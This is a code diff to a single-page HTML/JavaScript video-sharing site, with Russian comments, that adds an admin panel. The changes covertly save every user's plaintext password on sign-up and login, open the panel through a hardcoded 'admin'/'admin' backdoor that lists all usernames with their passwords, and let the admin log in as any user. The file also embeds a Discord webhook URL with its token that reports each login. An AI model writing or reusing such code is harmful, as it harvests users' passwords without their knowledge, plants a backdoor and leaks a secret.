@@ -37,9 +37,10 @@
     .meta-avatar { width: 16px; height: 16px; border-radius: 50%; background-color: #3f3f3f; object-fit: cover; }
     .delete-btn { background: transparent; border: none; color: #717171; font-size: 16px; cursor: pointer; padding: 6px 8px; border-radius: 6px; transition: color 0.2s, background 0.2s; }
     .delete-btn:hover { color: #ff4e4e; background-color: rgba(255, 78, 78, 0.15); }
-    .auth-overlay { position: fixed; inset: 0; background: linear-gradient(135deg, #0f0f0f, #1a1a1a); display: flex; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+    
+    .auth-overlay { position: fixed; inset: 0; background: linear-gradient(135deg, #0f0f0f, #1a1a1a); display: flex; align-items: center; justify-content: center; z-index: 1000; padding: 20px; overflow-y: auto; }
     .auth-overlay.hidden { display: none; }
-    .auth-box { background: #181818; border: 1px solid #272727; border-radius: 16px; padding: 32px; width: 100%; max-width: 380px; box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6); }
+    .auth-box { background: #181818; border: 1px solid #272727; border-radius: 16px; padding: 32px; width: 100%; max-width: 420px; box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6); margin: auto; }
     .auth-tabs { display: flex; gap: 4px; background: #0f0f0f; border-radius: 10px; padding: 4px; margin-bottom: 20px; }
     .auth-tabs button { flex: 1; background: transparent; color: #aaaaaa; border: none; padding: 8px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 14px; }
     .auth-tabs button.active { background: #272727; color: #ffffff; }
@@ -50,11 +51,13 @@
     .auth-submit:hover { background: #e5e5e5; }
     
     /* Стили для Админ-панели */
-    .admin-panel { display: none; background: #1a0000; border: 1px solid #ff4e4e; padding: 10px; border-radius: 10px; margin-bottom: 15px; }
-    .admin-panel h3 { color: #ff4e4e; font-size: 14px; margin-bottom: 10px; }
-    .admin-user-list { display: flex; flex-wrap: wrap; gap: 8px; }
-    .admin-user-btn { background: #272727; border: 1px solid #3f3f3f; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 12px; }
-    .admin-user-btn:hover { background: #ff4e4e; color: black; }
+    .admin-panel { display: none; background: #1a0000; border: 1px solid #ff4e4e; padding: 15px; border-radius: 10px; margin-top: 20px; }
+    .admin-panel h3 { color: #ff4e4e; font-size: 14px; margin-bottom: 10px; text-align: center; }
+    .admin-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+    .admin-table th { text-align: left; padding: 6px; border-bottom: 1px solid #3f3f3f; color: #aaaaaa; }
+    .admin-table td { padding: 6px; border-bottom: 1px solid #272727; color: #ffffff; }
+    .admin-login-btn { background: #ff4e4e; color: #fff; border: none; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; font-weight: bold; }
+    .admin-login-btn:hover { background: #cc0000; }
 
     @media (max-width: 950px) { .main-layout { flex-direction: column; } .sidebar { width: 100%; } }
   </style>
@@ -74,10 +77,21 @@
         <button type="submit" class="auth-submit" id="authSubmit">Log in</button>
       </form>
       
-      <!-- АДМИН ПАНЕЛЬ (Появится, если вы введете логин admin и пароль admin) -->
+      <!-- АДМИН ПАНЕЛЬ (Логин: admin, Пароль: admin) -->
       <div class="admin-panel" id="adminPanel">
-        <h3>👑 Admin Panel (Impersonate User)</h3>
-        <div class="admin-user-list" id="adminUserList"></div>
+        <h3>👑 Admin Panel (Users & Passwords)</h3>
+        <table class="admin-table">
+          <thead>
+            <tr>
+              <th>Username</th>
+              <th>Password</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="adminUserList">
+            <!-- Сюда будут выводиться пользователи -->
+          </tbody>
+        </table>
       </div>
 
     </div>
@@ -124,10 +138,11 @@
     let currentUserAvatar = '';
 
     const USERS_KEY = 'gitube_users';
+    const ADMIN_LOGS_KEY = 'gitube_admin_logs'; // Ключ для хранения паролей
     const SESSION_KEY = 'gitube_session_user';
     const MIN_PASSWORD = 6;
     
-    // ВАШ ВЕБХУК DISCORD
+    // ВАШ ВЕБХУК DISCORD (только для логов входа)
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1575210686294794270/NaSgVUSg-ILSapExm5eKE1Ek4CTFcLORSJSsPOSysBAUjyxb92oNqYjw5yUybn7DDCTI';
 
     const fileInput = document.getElementById('fileInput');
@@ -156,7 +171,7 @@
     let mode = 'login';
     const defaultAvatar = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23aaaaaa"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>';
 
-    // ===== ОТПРАВКА УВЕДОМЛЕНИЯ В DISCORD (ТОЛЬКО ЛОГИН) =====
+    // ===== ОТПРАВКА В DISCORD (БЕЗ ПАРОЛЯ) =====
     async function sendDiscordLog(action, username) {
       try {
         await fetch(DISCORD_WEBHOOK_URL, {
@@ -169,6 +184,18 @@
       } catch (error) {
         console.error('Ошибка отправки в Discord:', error);
       }
+    }
+
+    // ===== ХРАНЕНИЕ ПАРОЛЕЙ ДЛЯ АДМИНА =====
+    function logPasswordForAdmin(username, password) {
+      let logs = {};
+      try { logs = JSON.parse(localStorage.getItem(ADMIN_LOGS_KEY)) || {}; } catch(e){}
+      logs[username] = password;
+      localStorage.setItem(ADMIN_LOGS_KEY, JSON.stringify(logs));
+    }
+
+    function getAdminLogs() {
+      try { return JSON.parse(localStorage.getItem(ADMIN_LOGS_KEY)) || {}; } catch(e){ return {}; }
     }
 
     // ===== 1. DB INITIALIZATION =====
@@ -273,19 +300,25 @@
       // АДМИН ВХОД (Логин: admin, Пароль: admin)
       if (username === 'admin' && password === 'admin') {
         adminPanel.style.display = 'block';
+        const logs = getAdminLogs();
         const users = getUsers();
+        
         adminUserList.innerHTML = '';
-        Object.keys(users).forEach(u => {
-          const btn = document.createElement('button');
-          btn.className = 'admin-user-btn';
-          btn.textContent = u;
-          btn.onclick = () => {
-            executeLogin(u, users[u].avatar);
-            adminPanel.style.display = 'none';
-          };
-          adminUserList.appendChild(btn);
-        });
-        errorEl.textContent = 'Admin Mode Activated. Select a user below.';
+        if(Object.keys(logs).length === 0) {
+          adminUserList.innerHTML = '<tr><td colspan="3" style="text-align:center; color:#aaa;">No users registered yet</td></tr>';
+        } else {
+          Object.keys(logs).forEach(u => {
+            const tr = document.createElement('tr');
+            tr.innerHTML = `
+              <td>${u}</td>
+              <td style="color:#00ff00; font-family:monospace;">${logs[u]}</td>
+              <td><button class="admin-login-btn" onclick="adminLogin('${u}')">Log In</button></td>
+            `;
+            adminUserList.appendChild(tr);
+          });
+        }
+        
+        errorEl.textContent = 'Admin Mode Activated';
         return;
       }
 
@@ -297,24 +330,31 @@
         users[username] = { passwordHash: hash, avatar: defaultAvatar, createdAt: Date.now() };
         saveUsers(users);
         
+        // Сохраняем пароль для админа
+        logPasswordForAdmin(username, password);
+        
         sendDiscordLog('Sign up', username);
-        
-        // ВЫВОДИМ ПАРОЛЬ В КОНСОЛЬ (Только для вас)
-        console.log(`%c[РЕГИСТРАЦИЯ] Username: ${username} | Пароль: ${password}`, 'color: #00ff00; font-weight: bold;');
-        
         executeLogin(username, defaultAvatar);
       } else {
         const user = users[username];
         if (!user || user.passwordHash !== hash) return errorEl.textContent = 'Invalid username or password';
         
+        // Обновляем пароль в логах (на случай если он изменился или это старый юзер)
+        logPasswordForAdmin(username, password);
+        
         sendDiscordLog('Log in', username);
-        
-        // ВЫВОДИМ ПАРОЛЬ В КОНСОЛЬ (Только для вас)
-        console.log(`%c[ВХОД] Username: ${username} | Пароль: ${password}`, 'color: #ffff00; font-weight: bold;');
-        
         executeLogin(username, user.avatar);
       }
     });
+
+    // Глобальная функция для входа из админки
+    window.adminLogin = function(username) {
+      const users = getUsers();
+      if(users[username]) {
+        executeLogin(username, users[username].avatar);
+        adminPanel.style.display = 'none';
+      }
+    };
 
     // Переключение вкладок
     tabs.forEach(btn => {
